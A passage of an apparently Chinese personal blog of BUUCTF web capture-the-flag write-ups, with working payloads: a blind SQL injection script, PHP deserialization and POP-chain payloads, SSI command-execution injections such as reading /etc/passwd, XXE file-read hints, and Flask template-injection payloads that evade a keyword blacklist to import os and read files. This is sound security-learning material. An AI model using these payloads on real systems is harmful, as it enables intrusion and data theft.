class="line">            res &#x3D; payload(i, mid)</span><br><span class="line">            if res:</span><br><span class="line">                low &#x3D; mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high &#x3D; mid - 1</span><br><span class="line">        f &#x3D; int((low + high + 1)) &#x2F;&#x2F; 2</span><br><span class="line">        if (f &#x3D;&#x3D; 127 or f &#x3D;&#x3D; 31):</span><br><span class="line">            break</span><br><span class="line">        # print (f)</span><br><span class="line">        flag +&#x3D; chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">print(&#39;flag&#x3D;&#39;, flag)</span><br></pre></td></tr></table></figure>

<p>学习一波，因为二分法的速度会快一倍！</p>
<p>flag跑了三次才正确？不懂为啥</p>
<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>抓包看回显 有提示/time.php?source有源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b &#x3D; &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a &#x3D; $this-&gt;a;</span><br><span class="line">        $b &#x3D; $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;source&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]); </span><br></pre></td></tr></table></figure>

<p>构造一个反序列化函数就行了，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现eval无法执行？可能是有过滤吧，<br>所以这里引入一个assert函数：assert函数</p>
<p> 功能是判断一个表达式是否成立，返回true or false，重点是函数会执行此表达式。如果表达式为函数如assert(“echo(1)”)，则会输出1，而如果为assert(“echo 1;”)则不会有输出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a &#x3D; &quot;assert&quot;;</span><br><span class="line">        $this-&gt;b &#x3D; &quot;phpinfo()&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $a &#x3D; $this-&gt;a;</span><br><span class="line">        $b &#x3D; $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line">print(serialize($c));</span><br></pre></td></tr></table></figure>

<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>swp源码泄露</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		<span class="keyword">return</span> sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> $_POST[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            $file_shtml = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            $text = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>hash碰撞小脚本绕过第一个判断:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">10000</span>,<span class="number">9999999999</span>):</span><br><span class="line">    res=hashlib.md5(str(num).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> res[<span class="number">0</span>:<span class="number">6</span>]==<span class="string">&quot;6d0bc1&quot;</span>:</span><br><span class="line">        print(str(num))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>然后就直接用账号密码登录，抓包登录界面，就会发现一个文件网页链接:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210418162218.png" alt="img" style="zoom:67%;"><br>可以看到旁边有个public啥的，点入就可以发现<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210418162316.png" alt="img"></p>
<p>当然，这里用到一个新学的知识：</p>
<h4 id="ssi注入"><a href="#ssi注入" class="headerlink" title="ssi注入"></a>ssi注入</h4><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p>
<p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p>
<p><strong>1.2 SSI语法</strong></p>
<p>首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来。</p>
<p><strong>①显示服务器端环境变量&lt;#echo&gt;</strong></p>
<p>本文档名称：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!–#echo var&#x3D;&quot;DOCUMENT_NAME&quot;–&gt;</span><br><span class="line"></span><br><span class="line">现在时间：</span><br><span class="line"></span><br><span class="line">&lt;!–#echo var&#x3D;&quot;DATE_LOCAL&quot;–&gt;</span><br><span class="line"></span><br><span class="line">显示IP地址：</span><br><span class="line"></span><br><span class="line">&lt;! #echo var&#x3D;&quot;REMOTE_ADDR&quot;–&gt;</span><br></pre></td></tr></table></figure>

<p><strong>②**</strong>将文本内容直接插入到文档中&lt;#include&gt;**</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;! #include file&#x3D;&quot;文件名称&quot;–&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;index.html&quot; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;! #include virtual&#x3D;&quot;文件名称&quot;–&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;&#x2F;www&#x2F;footer.html&quot; --&gt;</span><br></pre></td></tr></table></figure>

<p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p>
<p><strong>③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文件最近更新日期：</span><br><span class="line"></span><br><span class="line">&lt;! #flastmod file&#x3D;&quot;文件名称&quot;–&gt;</span><br><span class="line"></span><br><span class="line">文件的长度：</span><br><span class="line"></span><br><span class="line">&lt;!–#fsize file&#x3D;&quot;文件名称&quot;–&gt;</span><br></pre></td></tr></table></figure>

<p><strong>④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!–#exec cmd&#x3D;&quot;文件名称&quot;–&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd&#x3D;&quot;cat &#x2F;etc&#x2F;passwd&quot;--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!–#exec cgi&#x3D;&quot;文件名称&quot;–&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cgi&#x3D;&quot;&#x2F;cgi-bin&#x2F;access_log.cgi&quot;–&gt;</span><br></pre></td></tr></table></figure>

<p>将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。</p>
<p><strong>⑤设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式</strong>)</p>
<p><strong>⑥高级SSI可设置变量使用if条件语句。</strong></p>
<h5 id="SSI挖掘思路"><a href="#SSI挖掘思路" class="headerlink" title="SSI挖掘思路"></a>SSI挖掘思路</h5><p>两个思路：</p>
<p>1.从业务场景来Fuzz，比如获取IP、定位、时间等<br>2.识别页面是否包含.stm,.shtm和.shtml后缀<br>这里是shtml后缀文件名，故思考是否存在ssi注入，发现用户名可控会被写入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;ls ..&#x2F;&quot;--&gt;</span><br><span class="line">&lt;!--#exec cmd&#x3D;&quot;cat &#x2F;&quot;--&gt;</span><br><span class="line">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;ls ..&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure>

<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>pop链构造题：<br>有点无语，我在本地的时候可以成功拿到flag但是在网页就不行了？？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var= <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Modifier();</span><br><span class="line">$b=<span class="keyword">new</span> show();</span><br><span class="line">$c=<span class="keyword">new</span> Test();</span><br><span class="line">$c-&gt;p=$a;</span><br><span class="line">$b-&gt;str=$c;</span><br><span class="line">$b-&gt;source=$b;</span><br><span class="line"><span class="keyword">print</span>(urlencode(serialize($b));</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210418185910.png" alt="img" style="zoom:67%;">

<p>想了一下 好像是因为我的版本存在那个漏洞:**在php7.1+对类属性的检测不严格，所以可以用public来绕过 **<br>所以我用了public的时候才可以成功，然后这里新学了一种姿势：<br>如果是protect类型的话，其实可以在最后加一个urlencode来进行编码，这样输入进去的空白字符就会被url转码，在url中输入的时候也不会被吃掉:<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>buuctf12</title>
    <url>/2021/04/18/buuctf12/</url>
    <content><![CDATA[<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>依旧是xxe注入：<br>但是这题flag不在根目录下没法直接读取，所以看了一下wp说是在内网主机中！？？？？？？？？？？果然还是做得题目少了，内网主机文件夹：<br>读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host <a id="more"></a><br>然后发现，接下来一个一个尝试就可以拿到flag了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210418204414.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210418204419.png" alt="img" style="zoom:67%;">

<p>附上一篇xxe注入的学习文章：<br><a href="https://xz.aliyun.com/t/3357#toc-11">https://xz.aliyun.com/t/3357#toc-11</a></p>
<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>又是flask框架 注入 ，确定是jingjia模板注入：</p>
<p>报错爆出了网站的源码文件app.py，那就先来一波任意文件读取看行不行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string <span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for <span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm <span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField <span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired <span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap <span class="keyword">import</span> base64 app = Flask(__name__) app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span> bootstrap = Bootstrap(app) <span class="class"><span class="keyword">class</span> <span class="title">NameForm</span>(<span class="params">FlaskForm</span>):</span> text = StringField(<span class="string">&#x27;BASE64加密&#x27;</span>,validators= [DataRequired()]) submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>) <span class="class"><span class="keyword">class</span> <span class="title">NameForm1</span>(<span class="params">FlaskForm</span>):</span> text = StringField(<span class="string">&#x27;BASE64解密&#x27;</span>,validators= [DataRequired()]) submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>) <span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">str</span>):</span> black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>] <span class="keyword">for</span> x <span class="keyword">in</span> black_list : <span class="keyword">if</span> x <span class="keyword">in</span> str.lower() : <span class="keyword">return</span> <span class="number">1</span> @app.route(<span class="string">&#x27;/hint&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]) <span class="function"><span class="keyword">def</span> <span class="title">hint</span>():</span> txt = <span class="string">&quot;失败乃成功之母！！&quot;</span> <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>,txt = txt) @app.route(<span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]) <span class="function"><span class="keyword">def</span> <span class="title">encode</span>():</span> <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) : text = request.values.get(<span class="string">&quot;text&quot;</span>) text_decode = base64.b64encode(text.encode()) tmp = <span class="string">&quot;结果 :&#123;0&#125;&quot;</span>.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>)) <span class="keyword">else</span> : text = <span class="string">&quot;&quot;</span> form = NameForm(text) <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form ,method = <span class="string">&quot;加密&quot;</span> ,img = <span class="string">&quot;flask.png&quot;</span>) @app.route(<span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]) <span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span> <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) : text = request.values.get(<span class="string">&quot;text&quot;</span>) text_decode = base64.b64decode(text.encode()) tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.format(text_decode.decode()) <span class="keyword">if</span> waf(tmp) : flash(<span class="string">&quot;no no no !!&quot;</span>) <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>)) res = render_template_string(tmp) flash( res ) <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>)) <span class="keyword">else</span> : text = <span class="string">&quot;&quot;</span> form = NameForm1(text) <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form, method = <span class="string">&quot;解密&quot;</span> , img = <span class="string">&quot;flask1.png&quot;</span>) @app.route(<span class="string">&#x27;/&lt;name&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]) <span class="function"><span class="keyword">def</span> <span class="title">not_found</span>(<span class="params">name</span>):</span> <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>,name = name) <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>) </span><br></pre></td></tr></table></figure>

<p>知道过滤了哪些字符了</p>
<p>接下来继续读取‘</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#x2F;&#x2F;这里也就不一定是需要catch_warnings了 也可以是下面的那个import很多很多</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210422200532.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_fl&#39;+&#39;ag.txt&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>尝试使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>构造语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].&#125;&#125;//在<span class="number">75</span>找到_frozen_importlib._ModuleLock可以指向builtins，而builtins里面有<span class="keyword">import</span>可以使用，并且也有file那些东西，这个<span class="number">75</span>是一个一个尝试出来的</span><br></pre></td></tr></table></figure>

<p>作罢，只能一个个尝试了</p>
<p>接下来继续构造语句</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;app.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>r然后后面的语句就和之前的没啥区别了，这题还是学到了很多东西，总觉得自己ssti注入学的不够深入，很奇怪，大概是python还没真正学好吧</p>
<p>这边有个点：<br>如果只是subclasses()的时候是出不了类的，但是builtins的时候是可以出他名下的函数，顺带出subclasses()的class</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210422230230.png" alt="img" style="zoom:67%;">

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>1.在python—ssti注入一文中添加了各个class可以使用的函数或者方法，以后就不会找的很迷茫了<br>2.一般情况下都是subclasses爆出所有类，然后一个个去尝试数字靠近使用，这题主要靠盲猜了，不然就是用一个for循环进行遍历，我觉得这题考察的本意也是如此想要让我们使用for循环进行遍历吧。<br>3.对于ssti注入 只能说继续学习吧！</p>
<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>ikun们冲鸭,一定要买到lv6!!! 可能是要买iv6？但是不知道咋买<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210422214946.png" alt="img" style="zoom:67%;"><br>脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://23d9591f-d9fe-4282-a6e2-c7aab436b5bb.node3.buuoj.cn/shop?page=&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">searchlv6</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        a=requests.get(url+str(i))</span><br><span class="line">        print(url+str(i))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> a.text:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    searchlv6()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

